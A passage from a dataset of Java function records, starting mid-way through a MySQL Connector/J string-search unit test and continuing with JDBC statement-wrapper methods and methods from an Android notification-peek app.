StringUtils.indexOfIgnoreCase(0, null, new String[] { \"abc\" }, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", (String[]) null, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] {}, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] { \"\", \"\" }, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"abc -- d\", new String[] { \"c\", \"d\" }, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(0, StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] { \"abc\" }, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1,\n            StringUtils.indexOfIgnoreCase(0, \"abc d   efg h\", new String[] { \" d \", \" efg\" }, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(0, \"abc d   efg h\", new String[] { \" d \", \"efg\" }, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n\n    // exhaustive test set\n    searchForMulti = new String[] { \"ONE\", \"two\", \"ThrEE\" };\n\n    // 1. simple strings\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"onetwothee\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(-1, StringUtils.indexOfIgnoreCase(0, \"one one one one         two\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(11, StringUtils.indexOfIgnoreCase(0, \"onetwothee one  two  three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(20,\n            StringUtils.indexOfIgnoreCase(0, \"/* one two three */ one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(38, StringUtils.indexOfIgnoreCase(0, \"/* one two three *//* one two three */one two three\", searchForMulti, markerStart, markerEnd,\n            StringUtils.SEARCH_MODE__ALL));\n    assertEquals(7,\n            StringUtils.indexOfIgnoreCase(0, \"/*one*/one/*two*/two/*three*/three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(0,\n            StringUtils.indexOfIgnoreCase(0, \"one/*one*/two/*two*/three/*three*/\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(16,\n            StringUtils.indexOfIgnoreCase(0, \"# one two three\\none two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(17,\n            StringUtils.indexOfIgnoreCase(0, \"-- one two three\\none two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(22,\n            StringUtils.indexOfIgnoreCase(0, \"/* one two three */--;one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(4,\n            StringUtils.indexOfIgnoreCase(0, \"/*! one two three */--;one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(9, StringUtils.indexOfIgnoreCase(0, \"/*!50616 one two three */--;one two three\", searchForMulti, markerStart, markerEnd,\n            StringUtils.SEARCH_MODE__ALL));\n    assertEquals(16,\n            StringUtils.indexOfIgnoreCase(0, \"\\\"one two three\\\" one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(16,\n            StringUtils.indexOfIgnoreCase(0, \"'one two three' one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(16,\n            StringUtils.indexOfIgnoreCase(0, \"`one two three` one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    assertEquals(16,\n            StringUtils.indexOfIgnoreCase(0, \"(one two three) one two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n\n    assertEquals(3, StringUtils.indexOfIgnoreCase(0, \"/* one   two   three */ one two three\", searchForMulti, markerStart, markerEnd,\n            StringUtils.SEARCH_MODE__NONE));\n    assertEquals(2,\n            StringUtils.indexOfIgnoreCase(0, \"# one   two   three\\none two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__NONE));\n    assertEquals(3,\n            StringUtils.indexOfIgnoreCase(0, \"-- one   two   three\\none two three\", searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__NONE));\n\n    // 2. complex string\n    searchIn = \"/* one  two  three *//* one two three */ one 'two' three -- \\\"one/* one */two  three\\\" one owt   three\\n\"\n            + \"onetwothree # 'one/* one */two  three' one owt   three\\noneone /* two *//* three */ -- `one/* one */two  three` one two   three\\n\"\n            + \"two -- three\\n\\n\\n/* three */threethree\";\n\n    printRuler(searchIn);\n    // 2.1. skip all\n    assertEquals(159, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__ALL));\n    // 2.2. search within block comments\n    searchMode = EnumSet.of(SearchMode.ALLOW_BACKSLASH_ESCAPE, SearchMode.SKIP_BETWEEN_MARKERS, SearchMode.SKIP_LINE_COMMENTS, SearchMode.SKIP_WHITE_SPACE);\n    assertEquals(3, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, markerStart, markerEnd, searchMode));\n    assertEquals(3, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, markerStart, markerEnd, StringUtils.SEARCH_MODE__NONE));\n    // 2.3. search within line comments and unidentified markers\n    searchMode = EnumSet\n            .of(SearchMode.ALLOW_BACKSLASH_ESCAPE, SearchMode.SKIP_BETWEEN_MARKERS, SearchMode.SKIP_BLOCK_COMMENTS, SearchMode.SKIP_WHITE_SPACE);\n    assertEquals(61, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, \"'`(\", \"'`)\", searchMode));\n    assertEquals(116, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, \"\\\"`(\", \"\\\"`)\", searchMode));\n    assertEquals(188, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, \"\\\"'(\", \"\\\"')\", searchMode));\n    assertEquals(212, StringUtils.indexOfIgnoreCase(0, searchIn, searchForMulti, markerStart, markerEnd, searchMode));\n\n    /*\n     * H. test indexOfIgnoreCase(int startingPosition, String searchIn, String searchFor[], String openingMarkers, String closingMarkers, Set<SearchMode>\n     * searchMode) illegal markers arguments\n     */\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value null for openingMarkers and/or - for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] { \"abc\" }, null, \"-\", EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value - for openingMarkers and/or null for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] { \"abc\" }, \"-\", null, EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value null for openingMarkers and/or null for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] { \"abc\" }, null, null, EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n    assertThrows(IllegalArgumentException.class,\n            \"Illegal argument value - for openingMarkers and/or -! for closingMarkers. These cannot be null and must have the same length.\",\n            new Callable<Void>() {\n                public Void call() throws Exception {\n                    StringUtils.indexOfIgnoreCase(0, \"abc\", new String[] { \"abc\" }, \"-\", \"-!\", EnumSet.of(SearchMode.SKIP_BETWEEN_MARKERS));\n                    return null;\n                }\n            });\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\testsuite\\simple\\StringUtilsTest.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#setFetchSize(int)\n */\n", "func_signal": "public void setFetchSize(int rows) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            this.wrappedStmt.setFetchSize(rows);\n        } else {\n            throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n        }\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#setEscapeProcessing(boolean)\n */\n", "func_signal": "public void setEscapeProcessing(boolean enable) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            this.wrappedStmt.setEscapeProcessing(enable);\n        } else {\n            throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n        }\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#execute(java.lang.String, java.lang.String[])\n */\n", "func_signal": "public boolean execute(String sql, String[] columnNames) throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedStmt.execute(sql, columnNames);\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return false; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#getConnection()\n */\n", "func_signal": "public Connection getConnection() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            return this.wrappedConn;\n        }\n\n        throw SQLError.createSQLException(\"Statement already closed\", SQLError.SQL_STATE_ILLEGAL_ARGUMENT, this.exceptionInterceptor);\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n\n    return null; // we actually never get here, but the compiler can't figure that out\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/*\n * (non-Javadoc)\n * \n * @see java.sql.Statement#cancel()\n */\n", "func_signal": "public void cancel() throws SQLException", "code": "{\n    try {\n        if (this.wrappedStmt != null) {\n            this.wrappedStmt.cancel();\n        }\n    } catch (SQLException sqlEx) {\n        checkAndFireConnectionError(sqlEx);\n    }\n}", "path": "\u6280\u672f\u96be\u70b9\u89e3\u51b3\u65b9\u6848\\1_3.\u642d\u5efaSSH\u6846\u67b6\uff08JAVA\uff09\\\u8981\u989d\u5916\u5bfc\u5165\u7684\u5305\\mysql-connector-java-5.1.33\\mysql-connector-java-5.1.33\\src\\com\\mysql\\jdbc\\jdbc2\\optional\\StatementWrapper.java", "repo_name": "JamesonHuang/Graduation-Project", "stars": 99, "license": "None", "language": "java", "size": 736823}
{"docstring": "/* If mSensorTimeoutMultiplier is -1, we don't remove listeners, but let them keep listening. */\n", "func_signal": "private void tryUnregisterEventListeners()", "code": "{\n    if (mSensorTimeoutMultiplier != SENSOR_TIME_OUT_INFINITE) {\n        mSensorHandler.unregisterEventListeners();\n    }\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\peek\\NotificationPeek.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Update background ImageView to display proper background according to user preference.\n */\n", "func_signal": "public void updateBackgroundImageView()", "code": "{\n\n    boolean used = WallpaperFactory.isWallpaperThemeSelected(mContext) &&\n            !WallpaperFactory.isLiveWallpaperUsed(mContext);\n\n    if (mPeekBackgroundImageView == null) {\n        mPeekBackgroundImageView = new ImageView(mContext);\n        ViewGroup.LayoutParams params =\n                new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,\n                        ViewGroup.LayoutParams.MATCH_PARENT);\n        mPeekBackgroundImageView.setLayoutParams(params);\n        mPeekBackgroundImageView.setScaleType(ImageView.ScaleType.CENTER_CROP);\n    }\n\n    if (used) {\n        mPeekBackgroundImageView.setImageBitmap(mWallpaperFactory.getPrefSystemWallpaper());\n        if (!isBackgroundImageViewAdded()) {\n            sPeekView.addView(mPeekBackgroundImageView, 0);\n        }\n    } else {\n        if (isBackgroundImageViewAdded()) {\n            sPeekView.removeViewAt(0);\n        }\n    }\n\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\peek\\NotificationPeek.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Check if the posted time of the notification is in quiet hour.\n *\n * @param postedTime Timestamp in ms to check.\n * @return True if it is in quiet hour, false otherwise.\n */\n", "func_signal": "public boolean isInQuietHour(long postedTime)", "code": "{\n    if (mQuietHour == null) {\n        updateQuietHour();\n    }\n\n    if (postedTime >= mFromTime && postedTime <= mToTime) {\n        return true;\n    }\n\n    return false;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\AppList.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Update quiet hour period.\n */\n", "func_signal": "public void updateQuietHour()", "code": "{\n    SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(mContext);\n    String quietHourStr = preferences\n            .getString(PreferenceKeys.PREF_QUIET_HOUR, PreferenceKeys.PREF_QUIET_HOUR_DEF);\n    mQuietHour = QuietHour.createQuietHour(quietHourStr);\n\n    Calendar calendar = Calendar.getInstance();\n    calendar.set(Calendar.HOUR_OF_DAY, mQuietHour.getFromHour());\n    calendar.set(Calendar.MINUTE, mQuietHour.getFromMin());\n    mFromTime = calendar.getTimeInMillis();\n\n    calendar.set(Calendar.HOUR_OF_DAY, mQuietHour.getToHour());\n    calendar.set(Calendar.MINUTE, mQuietHour.getToMin());\n    if (calendar.getTimeInMillis() < mFromTime) {\n        calendar.set(Calendar.DAY_OF_YEAR, calendar.get(Calendar.DAY_OF_YEAR) + 1);\n    }\n    mToTime = calendar.getTimeInMillis();\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\AppList.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Restore black list from SharedPreferences.\n *\n * @return List of {@link com.reindeercrafts.notificationpeek.blacklist.AppInfo}.\n */\n", "func_signal": "private ArrayList<AppInfo> restoreBlackList()", "code": "{\n    ArrayList<AppInfo> blackList = new ArrayList<AppInfo>();\n\n    SharedPreferences blackListPref = PreferenceManager.getDefaultSharedPreferences(mContext);\n    Set<String> blackListSet =\n            blackListPref.getStringSet(BLACK_LIST_PREF, new HashSet<String>());\n\n\n    for (String blockedAppStr : blackListSet) {\n        AppInfo appInfo = AppInfo.fromString(blockedAppStr);\n        if (appInfo.getPackageName().equals(AppInfo.EVERYTHING_PKG)) {\n            blackList.add(0, appInfo);\n        } else {\n            blackList.add(AppInfo.fromString(blockedAppStr));\n        }\n    }\n\n    return blackList;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\AppList.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Send broadcast to NotificationService, and let it perform the final dismiss action.\n *\n * @param pkg package name associated with the notification to be dismissed.\n * @param tag tag associated with the notification to be dismissed.\n * @param id  notification id associated with the notification to be dismissed.\n */\n", "func_signal": "public void onChildDismissed(String description, String pkg, String tag, int id)", "code": "{\n    // Send broadcast to NotificationService for dismiss action.\n    Intent intent = new Intent(NotificationService.ACTION_DISMISS_NOTIFICATION);\n    intent.putExtra(NotificationService.EXTRA_PACKAGE_NAME, pkg);\n    intent.putExtra(NotificationService.EXTRA_NOTIFICATION_TAG, tag);\n    intent.putExtra(NotificationService.EXTRA_NOTIFICATION_ID, id);\n    mContext.sendBroadcast(intent);\n\n    // Send broadcast to NotificationPeekActivity for updating NotificationView.\n    Intent updateViewIntent = new Intent(\n            NotificationPeekActivity.NotificationPeekReceiver.ACTION_DIMISS_NOTIFICATION);\n    updateViewIntent.putExtra(\n            NotificationPeekActivity.NotificationPeekReceiver.EXTRA_NOTIFICATION_DESCRIPTION,\n            description);\n    mContext.sendBroadcast(updateViewIntent);\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\peek\\NotificationPeek.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Show notification according to user preferences.\n *\n * @param n                     Notificaiton to display.\n * @param update                If the given notification is an update.\n * @param peekTimeoutMultiplier User preference: timeout.\n * @param sensorTimeout         User preference: sensor timeout.\n * @param showContent           User preference: always show content.\n */\n", "func_signal": "public void showNotification(StatusBarNotification n, boolean update, int peekTimeoutMultiplier,\n                             int sensorTimeout, boolean showContent)", "code": "{\n    mSensorTimeoutMultiplier = sensorTimeout;\n    mShowContent = showContent;\n    mPeekTimeoutMultiplier = peekTimeoutMultiplier;\n    showNotification(n, update, false);\n\n    updateNotificationTextAlpha(1);\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\peek\\NotificationPeek.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Initialize both fragments, but only add black list fragment.\n * The suggestion list fragment will be added on demand.\n */\n", "func_signal": "private void initFragments()", "code": "{\n    mBlackListFragment = new BlackListFragment();\n    mSuggestionFragment = new BlackListSuggestionFragment();\n    mSuggestionFragment.setSuggestionCallback(this);\n\n    getFragmentManager().beginTransaction()\n            .replace(R.id.fragment_container, mBlackListFragment)\n            .commit();\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\BlackListActivity.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Remove suggestion fragment and show black list again. This method is also used to handle\n * EditText behavior, i.e remove its focus, clear listener and clear text.\n *\n * @return  False if the suggestion fragment is hidden already. True otherwise.\n */\n", "func_signal": "private boolean hideSuggestionFragment()", "code": "{\n    if (!mSuggestionShowing) {\n        return false;\n    }\n    mSuggestionShowing = false;\n    getFragmentManager().popBackStack();\n\n    mSearchEditText.clearFocus();\n    mSearchEditText.removeTextChangedListener(this);\n    mSearchEditText.setText(\"\");\n\n    return true;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\BlackListActivity.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Constructs a new swipe-to-dismiss touch listener for the given list view.\n *\n * @param listView  The list view whose items should be dismissable.\n * @param callbacks The callback to trigger when the user has indicated that she would like to\n *                  dismiss one or more list items.\n */\n", "func_signal": "public SwipeDismissListViewTouchListener(ListView listView, DismissCallbacks callbacks)", "code": "{\n    ViewConfiguration vc = ViewConfiguration.get(listView.getContext());\n    mSlop = vc.getScaledTouchSlop();\n    mMinFlingVelocity = vc.getScaledMinimumFlingVelocity() * 16;\n    mMaxFlingVelocity = vc.getScaledMaximumFlingVelocity();\n    mAnimationTime = listView.getContext().getResources().getInteger(\n            android.R.integer.config_shortAnimTime);\n    mListView = listView;\n    mCallbacks = callbacks;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\utils\\SwipeDismissListViewTouchListener.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Sort the StatusBarNotifications stored in the HashMap with their posted time.\n *\n * @return A sorted List of StatusBarNotification.\n */\n", "func_signal": "public List<StatusBarNotification> getNotifications()", "code": "{\n    List<StatusBarNotification> list = new ArrayList<StatusBarNotification>(mNotifications.values());\n    Collections.sort(list, new NotificationTimeComparator());\n    return list;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\NotificationHub.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Restore object from String.\n *\n * @param str String generated from {@link com.reindeercrafts.notificationpeek.blacklist.AppInfo#getString()}\n *            method.\n * @return AppInfo object.\n */\n", "func_signal": "public static AppInfo fromString(String str)", "code": "{\n    if (!str.matches(\".*<>.*\")) {\n        return new AppInfo(\"\", \"\");\n    }\n    String[] infos = str.split(DELIMITER);\n    return new AppInfo(infos[0], infos[1]);\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\AppInfo.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Create a new {@link android.graphics.drawable.TransitionDrawable} object with correct order\n * of Drawables based on user selection.\n *\n * @return TransitionDrawable object created.\n */\n", "func_signal": "private TransitionDrawable initPreviewBackgroundDrawable()", "code": "{\n\n    boolean isWallpaperSelected = WallpaperFactory.isWallpaperThemeSelected(getActivity());\n    Drawable black = new ColorDrawable(Color.BLACK);\n    Drawable wallpaper =\n            mUseLiveWallpaper ? new ColorDrawable(Color.TRANSPARENT) : new BitmapDrawable(\n                    getResources(), mWallpaperFactory.getPrefSystemWallpaper());\n\n    mChangeDrawables =\n            !isWallpaperSelected ? new Drawable[]{black, wallpaper} : new Drawable[]{wallpaper, black};\n    mBlackDrawableIndex = !isWallpaperSelected ? 0 : 1;\n    return new TransitionDrawable(mChangeDrawables);\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\settings\\appearance\\AppearanceSettingsFragment.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Returns an {@link AbsListView.OnScrollListener} to be added to the {@link\n * ListView} using {@link ListView#setOnScrollListener(AbsListView.OnScrollListener)}.\n * If a scroll listener is already assigned, the caller should still pass scroll changes through\n * to this listener. This will ensure that this {@link SwipeDismissListViewTouchListener} is\n * paused during list view scrolling.</p>\n *\n * @see SwipeDismissListViewTouchListener\n */\n", "func_signal": "public AbsListView.OnScrollListener makeScrollListener()", "code": "{\n    return new AbsListView.OnScrollListener() {\n        @Override\n        public void onScrollStateChanged(AbsListView absListView, int scrollState) {\n            setEnabled(scrollState != AbsListView.OnScrollListener.SCROLL_STATE_TOUCH_SCROLL);\n        }\n\n        @Override\n        public void onScroll(AbsListView absListView, int i, int i1, int i2) {\n        }\n    };\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\utils\\SwipeDismissListViewTouchListener.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Save the current black list into SharedPreferences as String set.\n */\n", "func_signal": "public void storeBlackList()", "code": "{\n    if (!mBlackListChanged) {\n        // Black list hasn't changed since last restore.\n        return;\n    }\n    SharedPreferences blackListPref = PreferenceManager.getDefaultSharedPreferences(mContext);\n    HashSet<String> blackList = new HashSet<String>();\n\n    for (AppInfo appInfo : mCurrentBlackList) {\n        blackList.add(appInfo.getString());\n    }\n    blackListPref.edit().putStringSet(BLACK_LIST_PREF, blackList).apply();\n\n    if (mQuietHourChanged) {\n        // Notify NotificationService to update quiet hour.\n        Intent intent = new Intent(NotificationService.ACTION_QUIET_HOUR_CHANGE);\n        mContext.sendBroadcast(intent);\n    }\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\AppList.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/* Called after click event is triggered, used to clean up event listeners and\n * set mNextNotification to null. */\n", "func_signal": "public void onPostClick()", "code": "{\n    dismissNotification();\n    removeNotification((StatusBarNotification) mNotificationView.getTag());\n    mSensorHandler.unregisterEventListeners();\n    mNextNotification = null;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\peek\\NotificationPeek.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Replace black list fragment with suggestion list fragment, get ready to show suggestions.\n */\n", "func_signal": "private void showSuggestionFragment()", "code": "{\n    if (mSuggestionFragment == null || mSuggestionShowing) {\n        return;\n    }\n\n    mSuggestionShowing = true;\n\n    FragmentTransaction ft = getFragmentManager().beginTransaction();\n    ft.setCustomAnimations(R.animator.fragment_in, R.animator.fragment_out,\n            R.animator.fragment_in, R.animator.fragment_out);\n\n    ft.replace(R.id.fragment_container, mSuggestionFragment)\n            .addToBackStack(null).commit();\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\blacklist\\BlackListActivity.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
{"docstring": "/**\n * Seek Drawable index within TransitionDrawable object. We need to find the index of the\n * drawable that is the starting drawable of the TransitionDrawable.\n *\n * @return Index of the source drawable.\n */\n", "func_signal": "private int getSourceDrawableIndex()", "code": "{\n    if (mPreviewImageDrawable.getDrawable(0).getClass()\n            .equals(mPreviewImageDrawable.getDrawable(1).getClass())) {\n        // At this point we know that user is using the SeekBar to adjust background, so that\n        // we have two Drawables having the same type. Therefore, we return the last index of\n        // the TransitionDrawable, which points to the \"Current\" drawable that user chooses.\n        return 1;\n    }\n\n    // One of the Drawables is a ColorDrawable (Black), the other is a BitmapDrawable, choose the one\n    // that is different from the Black ColorDrawable.\n    return (mBlackDrawableIndex + 1) % 2;\n}", "path": "NotificationPeekPort\\src\\main\\java\\com\\reindeercrafts\\notificationpeek\\settings\\appearance\\AppearanceSettingsFragment.java", "repo_name": "lzanita09/NotificationPeekPort", "stars": 121, "license": "apache-2.0", "language": "java", "size": 4715}
